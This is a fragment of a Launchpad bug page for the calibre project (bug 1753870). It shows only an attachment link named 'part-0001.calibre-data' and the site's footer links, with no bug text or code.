[Subscribe someone else](https://bugs.launchpad.net/calibre/%2Bbug/1753870/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Bug attachments

* [part-0001.calibre-data](https://bugs.launchpad.net/calibre/%2Bbug/1753870/%2Battachment/5071173/%2Bfiles/part-0001.calibre-data)
  [Edit](/calibre/%2Bbug/1753870/%2Battachment/5071173 "Change attachment details")

* [Add attachment](/calibre/%2Bbug/1753870/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


